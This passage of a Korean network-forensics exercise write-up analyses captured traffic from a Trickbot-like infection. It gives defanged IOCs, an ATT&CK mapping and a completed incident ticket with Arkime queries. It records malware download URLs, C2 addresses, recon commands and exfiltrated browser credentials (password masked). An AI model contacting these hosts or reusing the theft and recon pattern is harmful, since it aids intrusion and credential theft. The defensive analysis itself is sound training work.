| 21:36:45–21:37:28 | 64.44.133.131에서 "PNG" 다운로드 |
| 21:36:47, 21:37:17 | 445 SMBv1 스캔 — 거절 |
| 21:36:52–21:37:52 | 203.176.135.102:8082로 `/81/` 비밀번호 POST 4개 |
| 21:36:59–21:38:49 | `/90` 정찰 POST(5,366바이트) |
| 21:42–21:46 | C2(449)와 다운로드(447, 443) 추가 |
| 21:46:06 | 마지막 악성 세션 종료 |
| 22:06:41 | 캡처 끝 |

## 침해 지표(IOC) { #iocs }

| 종류 | 지표 | 역할 |
|---|---|---|
| URL | `hxxp://bolton-tech[.]com/YAS20.exe` | 1단계 다운로드 |
| IP | `50.87.248[.]17` | bolton-tech.com(공유 호스팅) |
| URL | `hxxp://64.44.133[.]131/images/cursor.png`, `/images/imgpaper.png` | 위장 페이로드 |
| URL | `hxxp://203.176.135[.]102:8082/yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/81/` (`/90`) | HTTP 유출 |
| IP:포트 | `190.214.13[.]2:449` | TLS C2 |
| IP:포트 | `185.14.31[.]98:447` | TLS 다운로드, 자체 서명 인증서 |
| IP:포트 | `185.180.198[.]50:447` | C2(응답 없음) |
| IP | `51.254.164[.]244` | TLS 443, 자체 서명 |
| 도메인/IP | `filmstore[.]xyz` 45.148.120[.]153, `hakunamatatata[.]com` 199.247.13[.]144, `helpforyourservice[.]com` 209.97.130[.]197 | 수상한 TLS 다운로드 |
| 인증서 | CN `example.com`, O `Global Security`, OU `IT Department`, 시리얼 `008be295cd71603289` | C2 서버 인증서 |
| JA3 / JA3S | `72a589da586844d7f0818ce684948eea` / `e35df3e00ca4ef31d42b34bebaa2f86e` | TLS 지문(정상 프로그램과 겹칠 수 있음) |
| MD5 | `179345004c39336eaba39863b95f268b`, `9dfb3952172deeddb3a5e3cafed933bc`, `e40d7846eae7d8a98c0e3512e5461e4c` | 다운로드 3건의 HTTP 본문 |
| User-Agent | `KSKJJGJ`, `WinHTTP loader/1.0`, `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)` | 악성 모듈 |
| 프로세스 | `VMMM;;;;영상ثافوزبت.exe` | 업로드된 프로세스 목록에서 나온 호스트 IOC |
| 도메인 | `checkip.amazonaws[.]com` | IP 확인에 악용된 정상 서비스(참고용, 차단 대상 아님) |

## ATT&CK 매핑 { #attack }

| 기법 | 증거 |
|---|---|
| T1059 Command and Scripting Interpreter | `WinHttp.WinHttpRequest.5` 다운로드(스크립트는 추정) |
| T1105 Ingress Tool Transfer | YAS20.exe, "png" 페이로드, 447/443 다운로드 |
| T1016.001 Internet Connection Discovery | checkip.amazonaws.com |
| T1057, T1082, T1016, T1482, T1087 Discovery | proclist, systeminfo, ipconfig, net, nltest, 관리자 이름 |
| T1555.003 Credentials from Web Browsers | `/81/` IE, Firefox 비밀번호 |
| T1071.001 Web Protocols, T1573 Encrypted Channel | HTTP 8082, TLS 449/447 C2 |
| T1041 Exfiltration Over C2 Channel | `/81/`, `/90` POST |
| T1021.002 SMB/Windows Admin Shares(시도) | 445 SMBv1 스캔, 거절 |

---

## 침해사고 티켓 { #ticket }

### 티켓 양식 규칙 { #ticket-rules }

**설명(DESCRIPTION OF INVESTIGATION)은 두 문단 이내.** 그래도 다음이 모두 들어가야 합니다.

- 내부 IP와 호스트이름
- 외부 IP와 도메인
- 사용한 프로토콜과 포트
- 방향(directionality): 누가 먼저 연결했나(내부 → 외부 등)
- 파일 이름(너무 많으면 아래 칸에 목록으로)
- 악성 여부 판단과 악성코드 종류(알면). 판단 근거는 노트에 적음
- 공격 단계(보인 경우):
    - **C2:** 비콘 간격, C2 채널 상태(사용 중인지, 바이트가 오갔는지, 크기가 일정한지 변하는지)
    - **Exfil:** 유출 가능성이 있으면 시간, 파일 이름, 무엇이, 바이트, 방법

**포트:** 임시 포트(ephemeral)면 비워 둡니다. 측면 이동이 없으면 LATERAL 칸은 비워 둡니다.

**검색 쿼리:** 운영 중인 네트워크에서 **관심 트래픽만** 나올 만큼 구체적이어야 합니다. IP와 프로토콜을 지정하면 좁혀집니다.

**증거 위치:** `Team<#>: /home/<사용자>/<증거폴더>/<파일명>` 형식. 관심 트래픽 캡처와 의심 파일을 저장합니다(Arkime **Download PCAP**).

**작업 로그(Operation Log):**

- 무엇을 했는지 한 줄. 끝은 반드시 **Found / Not Found / Further Analysis Required**
- 줄마다 고유한 `[시간, 작업자]` 도장. 이 도장으로 도구 출력/노트와 연결
- 논리적인 순서로, 분석가가 어떻게 결론에 도달했는지 보이게

**도구 출력 / 노트(Tool Output / Notes):**

- 작업 로그 줄과 **같은 `[시간, 작업자]` 도장** — Ctrl+F로 둘이 같이 찾혀야 함
- 관련 발견의 도구 출력을 붙여 넣음
- 반드시 포함: 타임스탬프, 출발지 IP/호스트/계정과 목적지 IP/도메인, 관심 필드 전부(HTTP라면 uri, user agent, method, status code, referrer 등) — 증거 기록과 나중의 IOC 추적·상관분석용
- 발견이 무엇을 뜻하는지 분석 노트

**공개·공유 문서에서는:** 도메인을 무력화(`[.]`)하고 비밀 정보는 가립니다.

### 완성된 티켓 { #ticket-filled }

아래의 작업자 이름, 티켓 링크, 증거 경로는 자리표시이고 작업 로그 시간은 예시입니다. 오른쪽 위 복사 버튼으로 통째로 복사할 수 있습니다.

```text
#INDEX ENTRY#

[] -- 200311 2124 -- 10.3.11.194 LAPTOP-7XMV2SN -- Malware infection (Trickbot-like): exe download, credential theft and recon exfil via HTTP, TLS C2, failed SMB lateral movement -- <ticket-link>


#TICKET METADATA#

OPERATORS: <Analyst>

TIME OF INCIDENT: 200311 21:24:36 UTC

RELATED TICKETS:
N/A

DESCRIPTION OF INVESTIGATION:

At 200311 21:24:36 UTC LAPTOP-7XMV2SN (10.3.11.194, user otis.witherspoon, domain MONDOGREEK) made an HTTP GET (port 80) to 50.87.248.17 (bolton-tech[.]com) and downloaded the Windows executable YAS20.exe (466,944 bytes, application/x-msdownload). The request used the script User-Agent "WinHttp.WinHttpRequest.5" with no Referer, indicating it was fetched by a malicious script/document rather than a user browser. At 21:32:00 the host checked its public IP via checkip.amazonaws[.]com and from 21:32:07 established encrypted C2 over TLS to 190.214.13.2:449 (long-lived, low-byte sessions of 7-28 KB lasting 1-4 min, no fixed beacon interval, last session ended 21:46:06). A second C2 address 185.180.198.50:447 was attempted at 21:35:31 with no response. Additional payloads were downloaded: ~2.2 MB over TLS from 185.14.31.98:447 (self-signed cert CN example[.]com / O "Global Security" / OU "IT Department", created 200306), and cursor.png / imgpaper.png (~570 KB each, application/octet-stream, likely disguised executables) via HTTP from 64.44.133.131:80 using User-Agent "WinHTTP loader/1.0". Further encrypted downloads on 443 were made to hakunamatatata[.]com (199.247.13.144, 570 KB), helpforyourservice[.]com (209.97.130.197, 281 KB), filmstore[.]xyz (45.148.120.153) and 51.254.164.244 (self-signed); contents unknown.

Exfil occurred between 21:36:52 and 21:38:49 UTC via five cleartext HTTP POSTs (multipart/form-data) from 10.3.11.194 to 203.176.135.102:8082, URI /yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/<81|90>. Four /81/ POSTs (210-551 bytes) sent stolen browser credentials by source: IE passwords (facebook.com login for otis.witherspoon@mondogreek[.]com), Firefox passwords (accounts.firefox.com login with the SAME password, plus Firefox account tokens), and empty reports for OpenVPN configs and OpenSSH keys. The /90 POST (5,366 bytes) sent a full process list (incl. anomalous process "VMMM;;;;영상ثافوزبت.exe"), systeminfo and the output of ipconfig /all, net config workstation, net view /all (/domain), nltest /domain_trusts (/all_trusts), DC name Mondogreek-DC.mondogreek[.]com and admin account names. At 21:36:47 and 21:37:17 the host swept SMB port 445 on 10.3.11.119, 10.3.11.218, 10.3.11.1, 10.3.11.131 and 10.3.11.254 with SMBv1-only (NT LM 0.12) negotiate probes; all were refused (RST, 0 bytes returned), so lateral movement was attempted but NOT successful. No other internal host contacted any of the external IOCs. Determination: MALICIOUS - banking trojan / information stealer with modular downloader, pattern consistent with Trickbot (group tag "yas20"; unconfirmed, closed network). Credentials for otis.witherspoon are compromised. Further malware analysis of YAS20.exe, cursor.png and imgpaper.png is required.


#IMPACTED MACHINES#

INTERNAL IP/s & HOSTNAME/s:
10.3.11.194 LAPTOP-7XMV2SN (user otis.witherspoon, MAC b8:ca:3a:ec:3b:8f, Windows 10 Pro build 18363)

INTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)

LATERAL DESTINATION IP/s & HOSTNAME/s: (attempted only - refused)
10.3.11.119 LAPTOP-SQSA42O
10.3.11.218 LAPTOP-I9ZPI04
10.3.11.1 (default gateway)
10.3.11.131 (no response)
10.3.11.254 (no response)

LATERAL DESTINATION PORT/s:
Port 445 - SMB (SMBv1 negotiate probe)


#EXTERNAL MACHINES#

EXTERNAL IP/s & HOSTNAME/s:
50.87.248.17 (bolton-tech[.]com) - YAS20.exe download (HTTP 80)
64.44.133.131 - cursor.png / imgpaper.png download (HTTP 80)
203.176.135.102 - HTTP C2 / exfil (HTTP 8082)
190.214.13.2 - TLS C2 (449)
185.14.31.98 - TLS download channel, self-signed cert example[.]com (447)
185.180.198.50 - C2 attempted, no response (447)
51.254.164.244 - TLS, self-signed cert (443)
45.148.120.153 (filmstore[.]xyz) - TLS (443)
199.247.13.144 (hakunamatatata[.]com) - TLS download 570 KB (443)
209.97.130.197 (helpforyourservice[.]com) - TLS download 281 KB (443)
18.235.112.207 (checkip.amazonaws[.]com) - legitimate service, public IP lookup by malware (context only)

EXTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)

EXTERNAL DESTINATION PORT/s:
Port 80 - HTTP
Port 8082 - HTTP (non-standard)
Port 449 - TLS (non-standard)
Port 447 - TLS (non-standard)
Port 443 - TLS


#SEARCH QUERIES#

ARKIME (MOLOCH):
ip == 10.3.11.194 && ip == [50.87.248.17, 64.44.133.131, 203.176.135.102, 190.214.13.2, 185.14.31.98, 185.180.198.50, 51.254.164.244, 45.148.120.153, 199.247.13.144, 209.97.130.197]
ip.src == 10.3.11.194 && ip.dst == 10.3.11.0/24 && port.dst == 445

SPLUNK: (not run - Arkime-only analysis; equivalent Zeek query)
index=zeek sourcetype=conn:zeek id_orig_h=10.3.11.194 AND id_resp_h IN (50.87.248.17, 64.44.133.131, 203.176.135.102, 190.214.13.2, 185.14.31.98, 185.180.198.50, 51.254.164.244, 45.148.120.153, 199.247.13.144, 209.97.130.197)


#EVIDENCE LOCATIONS#

Team1: /home/<analyst>/evidence/200311_LAPTOP-7XMV2SN_YAS20_exe_download.pcap
Team1: /home/<analyst>/evidence/200311_LAPTOP-7XMV2SN_png_payload_download.pcap
Team1: /home/<analyst>/evidence/200311_LAPTOP-7XMV2SN_http8082_exfil_POST.pcap
Team1: /home/<analyst>/evidence/200311_LAPTOP-7XMV2SN_tls_c2_449_447.pcap
Team1: /home/<analyst>/evidence/200311_LAPTOP-7XMV2SN_smb445_sweep.pcap
(Exported from Arkime "Download PCAP". Full credentials/tokens are in the exfil PCAP only - masked in this ticket.)


#OPERATION LOG / ANALYST NOTES#

[251117 2000, Analyst] Establishing data time range and session count - Found
[251117 2003, Analyst] Reviewing protocol distribution and internal hosts - Found
[251117 2010, Analyst] Identifying host roles (DC) - Found
[251117 2015, Analyst] Mapping internal IPs to hostnames/users via Kerberos cname - Found
[251117 2020, Analyst] Checking external IP 52.242.211.89 seen as session initiator (possible inbound) - Not Found
[251117 2030, Analyst] Reviewing cleartext HTTP for executable downloads, raw-IP hosts, POST requests and unusual user agents - Found
[251117 2045, Analyst] Building timeline of suspicious HTTP sessions - Found
[251117 2105, Analyst] Collecting file type / Body MD5 of downloads from bolton-tech.com and 64.44.133.131 - Found
[251117 2110, Analyst] Inspecting POST /90 to 203.176.135.102:8082 for data upload - Found
[251117 2115, Analyst] Reviewing content of POST /90 body for exfiltrated data - Found
[251117 2120, Analyst] Reviewing content of POST /81/ body for exfiltrated data - Found
[251117 2125, Analyst] Reviewing remaining /81/ POSTs for credential sources - Found
[251117 2135, Analyst] Hunting outbound connections from 10.3.11.194 on non-standard ports - Found
[251117 2140, Analyst] Reviewing TLS certificates from 10.3.11.194 for self-signed / anomalous issuers - Found
[251117 2150, Analyst] Building timeline of TLS sessions to suspicious IPs / certificates (C2 hunt) - Found
[251117 2155, Analyst] Verifying self-signed certificate on 185.14.31.98:447 - Found
[251117 2205, Analyst] Checking for lateral movement from 10.3.11.194 to other internal hosts - Found
[251117 2210, Analyst] Verifying outcome of SMB probe to 10.3.11.119:445 - Not Found (no successful lateral movement)
[251117 2212, Analyst] Checking whether any other internal host contacted the external IOCs - Not Found

[Time -- Operator]

Tool Output / Notes:

[251117 2000, Analyst] Arkime, time range All. Data range 2020-03-11 21:22:35 - 22:06:41 UTC (44:06). 1,131 total sessions. Display timezone set to UTC.

[251117 2003, Analyst] SPI View (no filter). Internal network 10.3.11.0/24.
Src IP: 10.3.11.119 (491), 10.3.11.194 (377), 10.3.11.218 (259), 10.3.11.3 (3), 52.242.211.89 (1)
Protocols: tcp 672, udp 458, tls 349, dns 325, http2 126, ldap 79, krb5 78, http 44, dcerpc 41, smb 30, llmnr 29, ssdp 16, ntp 9, mdns 8, quic 6, igmp 1
Active Directory environment (ldap/krb5/dcerpc/smb). 3 workstations + 1 server.

[251117 2010, Analyst] Query: ip.dst == 10.3.11.3 -> 571 sessions. Protocols: udp 371, dns 325, tcp 200, ldap 79, krb5 78, dcerpc 41, smb 24, ntp 9. Src: 10.3.11.119 (251), 10.3.11.194 (170), 10.3.11.218 (150).
10.3.11.3 = Domain Controller / DNS (all krb5/ldap terminate here).

[251117 2015, Analyst] Query: ip.src == 10.3.11.0/24 && protocols == krb5 -> SPI View krb5 (cname/realm/sname).
Realm: MONDOGREEK.COM. DC: Mondogreek-DC.mondogreek.com (sname cifs/ldap)
10.3.11.3   Mondogreek-DC
10.3.11.119 LAPTOP-SQSA42O  user dorian.neff
10.3.11.194 LAPTOP-7XMV2SN  user otis.witherspoon
10.3.11.218 LAPTOP-I9ZPI04  user dominga.mcdowell

[251117 2020, Analyst] Query: ip.src == 52.242.211.89 -> 1 session.
200311 21:32:00 UTC 52.242.211.89:443 {ARIN} -> 10.3.11.194:50355 tcp, 2 packets, 283 bytes. TCP flags SYN 0 SYN-ACK 0 PSH 1 RST 1. Src MAC 20:e5:2a:b6:93:f1 (Netgear, gateway), Dst MAC b8:ca:3a:ec:3b:8f (Dell). Payload encrypted TLS record.
No handshake captured; mid-session server packet on 443 answered by client RST. Not an inbound connection. Benign.

[251117 2030, Analyst] Query: ip.src == 10.3.11.0/24 && protocols == http -> 44 sessions. SPI View http:
Body Magic: application/x-dosexec (2), application/octet-stream (2). Response content-type application/x-msdownload (1).
Request Method: GET 39, POST 5. Request content-type multipart/form-data (5, random boundaries).
Suspicious URIs:
 bolton-tech.com/YAS20.exe (1)
 64.44.133.131/images/cursor.png (2), 64.44.133.131/images/imgpaper.png (1)
 203.176.135.102:8082/yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/81/ (4), /90 (1)
 checkip.amazonaws.com/ (1)
Unusual User-Agents: KSKJJGJ (1), WinHTTP loader/1.0 (1), Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5) (1), Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E) (4)
Benign: ctldl.windowsupdate.com, ocsp.digicert.com, crl.securetrust.com (Microsoft-CryptoAPI/10.0), fonts.googleapis.com / fonts.gstatic.com, *.wsimg.com, notable-quotes.com, newegg.com, tuscaloosabarnyard.com (user browsing, Edge/Chrome UA).
C2 URI contains victim hostname LAPTOP-7XMV2SN + Windows build 18363 + bot ID.

[251117 2045, Analyst] Query: host.http == bolton-tech.com || ip.dst == 64.44.133.131 || ip.dst == 203.176.135.102 || host.http == checkip.amazonaws.com -> 9 sessions, all from 10.3.11.194.
200311 21:24:36UTC 10.3.11.194 49727 50.87.248.17 80 GET 200 bolton-tech.com /YAS20.exe 1.1 Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
  Request headers only: Connection, Accept */*, User-Agent, Host (no Referer). Response: Server Apache, Content-Type application/x-msdownload, Content-Length 466944, Last-Modified Tue, 10 Mar 2020 11:32:37 GMT, host-header c2hhcmVkLmJsdWVob3N0LmNvbQ== (CyberChef From Base64 = shared.bluehost.com -> shared hosting, likely compromised site). 389 pkts, 488,507 bytes.
200311 21:32:00UTC 10.3.11.194 49787 18.235.112.207 80 GET checkip.amazonaws.com / (11 pkts, 950 bytes) - public IP check 7.5 min after download
200311 21:36:45UTC 10.3.11.194 49816 64.44.133.131 80 GET /images/cursor.png + /images/imgpaper.png (979 pkts, 1,218,352 bytes)
200311 21:36:52UTC 10.3.11.194 50080 203.176.135.102 8082 POST /yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/81/ (1,396 bytes)
200311 21:36:55UTC 10.3.11.194 50081 203.176.135.102 8082 POST .../81/ (1,673 bytes)
200311 21:36:57UTC 10.3.11.194 50082 64.44.133.131 80 GET /images/cursor.png (540 pkts, 611,579 bytes)
200311 21:36:59UTC 10.3.11.194 50091 203.176.135.102 8082 POST .../90 (6,771 bytes)
200311 21:37:19UTC 10.3.11.194 50098 203.176.135.102 8082 POST .../81/ (1,341 bytes)
200311 21:37:52UTC 10.3.11.194 50099 203.176.135.102 8082 POST .../81/ (1,332 bytes)
No further HTTP to these IPs until end of capture (22:06:41).

[251117 2105, Analyst] Query: host.http == bolton-tech.com || ip.dst == 64.44.133.131 -> 3 sessions.
Body Magic: application/x-dosexec (2).
Body MD5: 179345004c39336eaba39863b95f268b, 9dfb3952172deeddb3a5e3cafed933bc, e40d7846eae7d8a98c0e3512e5461e4c (HTTP bodies of YAS20.exe / cursor.png / imgpaper.png; per-file mapping not confirmed). Hash lookup not possible (closed network) - for malware analysis.
64.44.133.131 responses: HTTP/1.1 200 OK, Server nginx/1.6.2, malformed header "Content-Type: Content-type: application/octet-stream".
 imgpaper.png Content-Length 582656 (Date 21:36:59 GMT); cursor.png Content-Length 582144 (Date 21:37:06 GMT).
 Requests: GET /images/<file>.png, Cache-Control no-cache, Pragma no-cache, User-Agent WinHTTP loader/1.0, Host 64.44.133.131.
~570 KB "png" files from raw IP via downloader UA -> likely disguised executables.

[251117 2110, Analyst] /90 session: 200311 21:36:59-21:38:49 UTC 10.3.11.194 50091 203.176.135.102 {APNIC} 8082
POST /yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/90 HTTP/1.1, User-Agent KSKJJGJ, Content-Type multipart/form-data; boundary=aksgja8s8d8a8s97, Content-Length 5366, Cache-Control no-cache.
Src 10 pkts 6,161 bytes (databytes 5,609) / Dst 9 pkts 610 bytes (databytes 120) -> upload.
Response: 200 OK, server Cowboy, Content-Type text/plain, content-length 3, body "/1/" (acknowledgement).
Body MD5s: f09673ad745e39470708028f7431f6d6, fa06d89c65fb808240e37f4c9e128955.

[251117 2115, Analyst] /90 POST body (Packet Options > Hide Images & Files, ascii). Cleartext, 2 parts:
 name="proclist": "***TASK LIST***" full process list - System, smss.exe, csrss.exe, wininit.exe, winlogon.exe, services.exe, lsass.exe, svchost.exe ..., MsMpEng.exe, NisSrv.exe, explorer.exe, OfficeClickToRun.exe ...
   Anomalous process: "VMMM;;;;영상ثافوزبت.exe" (mixed Latin/Korean/Arabic) - likely malware process. Host IOC.
 name="sysinfo": "***SYSTEMINFO***" HostName LAPTOP-7XMV2SN, OSName Microsoft Windows 10 Pro, 64-bit, Workstation, RegisteredOwner admin, TotalPhysicalMemory 6493 Mb
   /c ipconfig /all - Host LAPTOP-7XMV2SN, DNS suffix mondogreek.com, MAC B8-CA-3A-EC-3B-8F, IPv4 10.3.11.194/24, GW 10.3.11.1, DHCP/DNS 10.3.11.3
   /c net config workstation - \\LAPTOP-7XMV2SN, user otis.witherspoon, domain MONDOGREEK
   /c net view /all ; /c net view /all /domain - System error 6118
   /c nltest /domain_trusts ; /c nltest /domain_trusts /all_trusts - 0: MONDOGREEK mondogreek.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)
   ***LOCAL MACHINE DATA*** User CN=Otis Witherspoon,CN=Users,DC=mondogreek,DC=com; Computer CN=LAPTOP-7XMV2SN,CN=Computers,DC=mondogreek,DC=com; Domain controller Mondogreek-DC.mondogreek.com; Admin Name: Administrator (x3)
 MAC in ipconfig matches Arkime Src Ethernet b8:ca:3a:ec:3b:8f.
Exfil of host/network/domain reconnaissance. ATT&CK: T1057, T1082, T1016, T1482, T1087 (Discovery); T1041 (Exfiltration Over C2 Channel). Domain trust and admin enumeration = preparation for lateral movement.

[251117 2120, Analyst] 200311 21:36:52-21:36:54 UTC 10.3.11.194 50080 203.176.135.102 8082 POST .../81/
User-Agent Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E), Accept */*, boundary ---------ATBOXLGQOOBDZTLA, Content-Length 274, Connection Close.
 name="data": https://www.facebook.com/|otis.witherspoon@mondogreek.com|P@ss********  (URL|user|password, cleartext - masked, full value in PCAP)
 name="source": IE passwords
Response 200, server Cowboy, content-length 3.
Credential theft from browser store. ATT&CK T1555.003, T1041.

[251117 2125, Analyst] Remaining /81/ POSTs (same fake MSIE 7.0 UA, random boundaries, reply "/1/"):
200311 21:36:55UTC 10.3.11.194 50081 -> 203.176.135.102 8082, Content-Length 551, boundary ---------XWQEFTQLCLTQBJQE, source "firefox passwords"
 data: chrome://FirefoxAccounts|<account id>|{"version":1,"accountData":{"keyFetchToken":"<masked>","unwrapBKey":"<masked>"}} ; https://accounts.firefox.com|otis.witherspoon@mondogreek.com|P@ss******** (same password as Facebook) ; "No passwords found"
200311 21:37:19UTC 10.3.11.194 50098 -> 203.176.135.102 8082, Content-Length 219, boundary ---------MDLIZHCZZMRSOFHE, source "OpenVPN passwords and configs", data empty
200311 21:37:52UTC 10.3.11.194 50099 -> 203.176.135.102 8082, Content-Length 210, boundary ---------TAGOVQVWGJFPBAJU, source "OpenSSH private keys", data empty
/81/ = credential module reporting per source. Password reuse across sites -> high risk the domain password is the same. OpenVPN/OpenSSH: nothing stolen.

[251117 2135, Analyst] Query: ip.src == 10.3.11.194 && ip.dst != 10.0.0.0/8 && port.dst != 80 && port.dst != 443 && port.dst != 53 -> 26 sessions.
Dst IP: 190.214.13.2 (6), 224.0.0.252 (6), 203.176.135.102 (5), 185.14.31.98 (3), 239.255.255.250 (3), 224.0.0.251 (2), 185.180.198.50 (1)
Protocols: tcp 15, udp 11, tls 9, llmnr 6, http 5, ssdp 3, mdns 2
224.0.0.252 / 239.255.255.250 / 224.0.0.251 = LLMNR / SSDP / mDNS multicast (benign). 9 TLS sessions on non-standard ports to raw external IPs.

[251117 2140, Analyst] Query: ip.src == 10.3.11.194 && protocols == tls -> SPI View cert. Mostly Microsoft / Baltimore / DigiCert / Let's Encrypt (benign).
Anomalous: Issuer & Subject CN example.com (4), Issuer & Subject ON "Global Security" / OU "IT Department" (4); Issuer & Subject ON "Internet Widgits Pty Ltd" (2, OpenSSL default); Subject CN filmstore.xyz (1), hakunamatatata.com (1), helpforyourservice.com (1); Issuer cPanel, Inc. (1).

[251117 2150, Analyst] Query: ip.src == 10.3.11.194 && (ip.dst == 190.214.13.2 || ip.dst == 185.14.31.98 || ip.dst == 185.180.198.50 || cert.issuer.cn == example.com || cert.issuer.on == "Internet Widgits Pty Ltd" || cert.subject.cn == [filmstore.xyz, hakunamatatata.com, helpforyourservice.com]) -> 14 sessions:
200311 21:31:58UTC 10.3.11.194 49783 45.148.120.153 443 tls, cert:certificate-authority (cPanel), Alt Name filmstore.xyz, cpanel.filmstore.xyz, cpcalendars.filmstore.xyz - 68 pkts, 62,330 bytes
200311 21:31:59UTC 10.3.11.194 49784 51.254.164.244 443 tls, cert:self-signed - 107 pkts, 61,538 bytes
200311 21:32:07UTC 10.3.11.194 49788 190.214.13.2 449 tls - 32 pkts, 7,821 bytes (until 21:33:16)
200311 21:35:31UTC 10.3.11.194 49793 185.180.198.50 447 tcp - 6 pkts, 0 databytes / 384 bytes (no response)
200311 21:35:53UTC 10.3.11.194 49808 185.14.31.98 447 tls, cert:self-signed - 1,666 pkts, 2,049,123 databytes / 2,139,108 bytes (until 21:38:14)
200311 21:35:55UTC 10.3.11.194 49809 190.214.13.2 449 tls - 136 pkts, 27,788 bytes (until 21:39:37)
200311 21:35:58UTC 10.3.11.194 49810 190.214.13.2 449 tls - 117 pkts, 22,607 bytes (until 21:39:31)
200311 21:37:01UTC 10.3.11.194 50092 190.214.13.2 449 tls - 48 pkts, 7,801 bytes (until 21:39:57)
200311 21:42:12UTC 10.3.11.194 50112 190.214.13.2 449 tls - 52 pkts, 11,301 bytes (until 21:46:06)
200311 21:42:13UTC 10.3.11.194 50113 185.14.31.98 447 tls, cert:self-signed - 35 pkts, 24,643 bytes
200311 21:42:17UTC 10.3.11.194 50114 190.214.13.2 449 tls - 43 pkts, 7,964 bytes (until 21:46:06)
200311 21:43:40UTC 10.3.11.194 50128 199.247.13.144 443 tls, cert:certificate-authority, Alt Name hakunamatatata.com - 518 pkts, 569,667 bytes
200311 21:43:51UTC 10.3.11.194 50131 209.97.130.197 443 tls, cert:certificate-authority, Alt Name helpforyourservice.com - 243 pkts, 281,286 bytes
200311 21:44:02UTC 10.3.11.194 50136 185.14.31.98 447 tls, cert:self-signed - Src 29 pkts 2,185 bytes / Dst 82 pkts 111,326 bytes (download)
C2 assessment: 190.214.13.2:449 = persistent C2 (long-lived low-byte sessions, no fixed interval, active 21:32:07-21:46:06). 185.14.31.98:447 = module/payload download channel. 185.180.198.50:447 = C2 attempted, unreachable. No C2 traffic after 21:46:06.

[251117 2155, Analyst] Session 200311 21:44:02 10.3.11.194:50136 -> 185.14.31.98:447 {RIPE}
TLSv1.2, TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, JA3 72a589da586844d7f0818ce684948eea, JA3S e35df3e00ca4ef31d42b34bebaa2f86e, JA4 t12i190700_d83cc789557e_16bbda4055b2
Certificate (single): Serial 008be295cd71603289, Not Before 2020/03/06 09:53:10 UTC, Not After 2021/03/06 09:53:10 UTC (365 days)
Issuer CN example.com, O Global Security, OU IT Department = Subject CN example.com, O Global Security, OU IT Department -> self-signed confirmed. Certificate created 5 days before incident.

[251117 2205, Analyst] Query: ip.src == 10.3.11.194 && ip.dst == 10.3.11.0/24 && ip.dst != 10.3.11.3 -> 20 sessions.
UDP 137/138 -> 10.3.11.255 single packets at 21:23:00, 21:23:05, 21:27:02, 21:35:00, 21:47:02, 21:59:04 (normal NetBIOS). Burst 21:36:19-21:37:21 (udp 137: 22 pkts 2,024 bytes; udp 138: 21 pkts 4,536 bytes) = "net view /all" seen in /90 exfil.
TCP 445 sweep at 200311 21:36:47UTC (sequential src ports 49818-49929):
 10.3.11.194 -> 10.3.11.119 445 smb x2 (5 pkts, 51 databytes / 345 bytes) + tcp x1 (6 pkts, 0 databytes)
 10.3.11.194 -> 10.3.11.218 445 smb x2 (5 pkts, 51 / 345) + tcp x1 (6 pkts, 0 databytes)
 10.3.11.194 -> 10.3.11.1 445 (2 sessions, 2 pkts each, 0 databytes); -> 10.3.11.254 445 (1 pkt); -> 10.3.11.131 445 (1 pkt) - no response
200311 21:37:17UTC 10.3.11.194 50097 -> 10.3.11.119 445 smb; 10.3.11.194 50095 -> 10.3.11.218 445 smb (5 pkts, 51 / 345 each)
Lateral movement attempt via SMB (ATT&CK T1021.002 attempt).

[251117 2210, Analyst] Session 200311 21:37:17 10.3.11.194:50097 -> 10.3.11.119:445 (Dst MAC 10:98:36:59:9d:cc Dell)
TCP flags SYN 1, SYN-ACK 1, ACK 1, PSH 1, RST 1. Src payload "\xffSMB r" = SMBv1 Negotiate Protocol Request offering only dialect "NT LM 0.12". Dst: 2 packets, 120 bytes, 0 databytes (SYN-ACK + RST, no SMB response).
SMBv1-only probe refused by target (SMBv1 disabled). No share, user or file activity. SMBv1-only probing is typical of EternalBlue-style worm spreading. Lateral movement NOT successful.

[251117 2212, Analyst] Query: ip.dst == [50.87.248.17, 64.44.133.131, 203.176.135.102, 190.214.13.2, 185.14.31.98, 185.180.198.50, 51.254.164.244, 45.148.120.153, 199.247.13.144, 209.97.130.197] && ip.src != 10.3.11.194 -> 0 sessions.
No other internal host contacted the external IOCs. 10.3.11.119 and 10.3.11.218 show no sign of infection in network data.

RECOMMENDATIONS:
- Isolate LAPTOP-7XMV2SN (10.3.11.194) and hand to host IR (Velociraptor triage: process "VMMM;;;;영상ثافوزبت.exe", YAS20.exe, persistence).
- Reset otis.witherspoon domain password and all reused passwords (Facebook, Firefox); revoke Firefox account sessions.
- Block external IOCs (IPs / domains above) at perimeter.
- Malware analysis of YAS20.exe, cursor.png, imgpaper.png (Body MD5 above).
- Confirm SMBv1 disabled on all hosts; monitor 10.3.11.119 / 10.3.11.218.
```

### 빈 티켓 양식 { #ticket-template }

```text
#INDEX ENTRY#

[] -- <YYMMDD HHMM> -- <IP> <hostname> -- <description> -- <ticket link>


#TICKET METADATA#

OPERATORS:

TIME OF INCIDENT: <YYMMDD HH:MM:SS> UTC

RELATED TICKETS:
[] -- <datetime> - <IP> <hostname> - <description> - <ticket link>

DESCRIPTION OF INVESTIGATION: (NO MORE THAN TWO PARAGRAPHS)
- Internal IPs with hostnames / external IPs with domains
- Protocol and port / directionality (who initiated)
- File names / verdict with malware type (if known)
- Life-cycle stages: initial access, C2 (interval, state, bytes), exfil (time, what, bytes, method)


#IMPACTED MACHINES#

